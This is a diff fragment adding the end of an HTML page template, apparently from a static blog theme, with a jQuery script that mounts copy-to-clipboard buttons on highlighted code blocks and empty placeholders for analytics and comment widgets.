+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
